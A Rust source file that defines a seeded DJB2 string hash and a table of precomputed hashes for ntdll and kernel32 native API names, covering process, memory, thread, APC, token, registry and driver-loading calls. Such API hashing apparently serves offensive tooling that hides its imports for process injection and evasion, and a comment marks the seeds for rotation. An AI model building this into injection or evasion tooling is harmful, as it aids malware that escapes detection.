/**
 * Hash Constants - Seeded DJB2 + XOR finalization
 * Algorithm: seed=0x4E67C6A7, body=((h<<5)+h)+c, xor=0x2B8E4F91
 */
pub const HASH_SEED: u32 = 0x4E67C6A7; // TODO: USE NEW NUMBERS  
pub const HASH_XOR: u32 = 0x2B8E4F91; // TODO: USE NEW NUMBERS

pub const fn hash_function(name: &[u8]) -> u32 {
    let mut h: u32 = HASH_SEED;
    let mut i = 0;
    while i < name.len() {
        let byte = name[i];
        let c = if byte >= b'A' && byte <= b'Z' {
            byte + 32
        } else {
            byte
        };
        h = ((h << 5).wrapping_add(h)).wrapping_add(c as u32);
        i += 1;
    }
    h ^ HASH_XOR
}

pub const fn hash_module_wide(name: &[u16]) -> u32 {
    let mut h: u32 = HASH_SEED;
    let mut i = 0;
    while i < name.len() {
        let wide = name[i];
        let byte = (wide & 0xFF) as u8;
        let c = if byte >= b'A' && byte <= b'Z' {
            byte + 32
        } else {
            byte
        };
        h = ((h << 5).wrapping_add(h)).wrapping_add(c as u32);
        i += 1;
    }
    h ^ HASH_XOR
}

pub const fn hash_str(name: &str) -> u32 {
    hash_function(name.as_bytes())
}

// Modules
pub const NTDLL_HASH: u32 = 0x59ac125e;
pub const KERNEL32_HASH: u32 = 0xab506c86;

// Process
pub const NTOPENPROCESS_HASH: u32 = 0x8088b60b;
pub const NTTERMINATEPROCESS_HASH: u32 = 0xf74ca620;
pub const NTQUERYINFORMATIONPROCESS_HASH: u32 = 0x859b7355;
pub const NTCREATEPROCESSEX_HASH: u32 = 0x950ce388;
pub const NTGETNEXTPROCESS_HASH: u32 = 0x404614d6;

// Memory
pub const NTALLOCATEVIRTUALMEMORY_HASH: u32 = 0xa86cb4bf;
pub const NTWRITEVIRTUALMEMORY_HASH: u32 = 0x44fafd25;
pub const NTREADVIRTUALMEMORY_HASH: u32 = 0xc5bd5654;
pub const NTPROTECTVIRTUALMEMORY_HASH: u32 = 0xa0f9e1fb;

// Thread
pub const NTCREATETHREADEX_HASH: u32 = 0x3af328c3;
pub const NTRESUMETHREAD_HASH: u32 = 0x81de5923;
pub const NTQUEUEAPCTHREAD_HASH: u32 = 0x4744b3cb;
pub const NTGETCONTEXTTHREAD_HASH: u32 = 0xd0824b77;
pub const NTSETCONTEXTTHREAD_HASH: u32 = 0xa60784e3;
pub const NTSETINFORMATIONTHREAD_HASH: u32 = 0x6d44c642;

// Synchronization
pub const NTWAITFORSINGLEOBJECT_HASH: u32 = 0x0b31ae2f;
pub const NTDELAYEXECUTION_HASH: u32 = 0x738381dd;

// Handle
pub const NTCLOSE_HASH: u32 = 0x4cf64d4e;
pub const NTDUPLICATEOBJECT_HASH: u32 = 0xd8b72bca;

// File I/O
pub const NTCREATEFILE_HASH: u32 = 0xed9c324c;
pub const NTWRITEFILE_HASH: u32 = 0x44efece5;
pub const NTREADFILE_HASH: u32 = 0x5ad7c4f4;
pub const NTSETINFORMATIONFILE_HASH: u32 = 0x510cf00a;
pub const NTDELETEFILE_HASH: u32 = 0xa20f588d;
pub const NTQUERYDIRECTORYFILE_HASH: u32 = 0x1c7c8d05;
pub const NTQUERYVOLUMEINFORMATIONFILE_HASH: u32 = 0xa518e4ec;

// Section / Memory mapping
pub const NTCREATESECTION_HASH: u32 = 0x23106503;
pub const NTMAPVIEWOFSECTION_HASH: u32 = 0x4fc3e7bd;
pub const NTUNMAPVIEWOFSECTION_HASH: u32 = 0x3c8f8c7e;

// System information
pub const NTQUERYSYSTEMINFORMATION_HASH: u32 = 0xbf878c5b;

// Token
pub const NTOPENPROCESSTOKEN_HASH: u32 = 0xe978996a;
pub const NTQUERYINFORMATIONTOKEN_HASH: u32 = 0xb0182db7;
pub const NTDUPLICATETOKEN_HASH: u32 = 0xdbf4ed54;
pub const NTOPENTHREADTOKEN_HASH: u32 = 0x04a49c45;
pub const NTADJUSTPRIVILEGESTOKEN_HASH: u32 = 0x9195fa3e;

// I/O Completion (thread pool)
pub const NTSETIOCOMPLETION_HASH: u32 = 0xe7bf93b6;
pub const NTQUERYINFORMATIONWORKERFACTORY_HASH: u32 = 0x36ef45e6;

// Registry
pub const NTCREATEKEY_HASH: u32 = 0xddf28cd7;
pub const NTSETVALUEKEY_HASH: u32 = 0x12aa572a;
pub const NTOPENKEY_HASH: u32 = 0xE25269D5;
pub const NTQUERYVALUEKEY_HASH: u32 = 0xFDAB6FF4;
pub const NTDELETEKEY_HASH: u32 = 0xA443FF34;

// Driver
pub const NTLOADDRIVER_HASH: u32 = 0xB5F07844;
pub const NTUNLOADDRIVER_HASH: u32 = 0xBA0B32C9;
